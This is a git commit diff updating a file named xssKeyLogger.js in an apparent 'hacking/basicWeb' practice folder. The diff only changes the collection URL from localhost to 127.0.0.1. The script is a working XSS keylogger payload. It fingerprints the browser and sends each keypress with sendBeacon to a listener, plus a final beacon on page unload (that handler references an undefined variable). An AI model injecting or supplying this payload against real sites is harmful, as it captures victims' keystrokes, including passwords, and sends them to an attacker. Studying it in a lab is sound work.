843b9a1aeca771cbb9fdb7ed4b6a123fd2a9b1ba
galgkhjkhk <israelrubenstein@icloud.com>
2026-03-08 14:57:23 -0600

    Update xssKeyLogger.js

--- hacking/basicWeb/xssKeyLogger.js
+++ hacking/basicWeb/xssKeyLogger.js
@@ -1,7 +1,7 @@
 const id = btoa(navigator.userAgent + screen.width + screen.height).slice(0, 12);
 
   document.addEventListener('keypress', function(e) {
-      navigator.sendBeacon('http://localhost:7777/keylogger', JSON.stringify({
+      navigator.sendBeacon('http://127.0.0.1:7777/keylogger', JSON.stringify({
         done: false,
         id: id,
         key: e.key
@@ -9,7 +9,7 @@ const id = btoa(navigator.userAgent + screen.width + screen.height).slice(0, 12)
   });
 
   window.addEventListener('beforeunload', function() {
-      navigator.sendBeacon('http://localhost:7777/keylogger', JSON.stringify({
+      navigator.sendBeacon('http://127.0.0.1:7777/keylogger', JSON.stringify({
         done: true,
         id: id,
         key: e.key
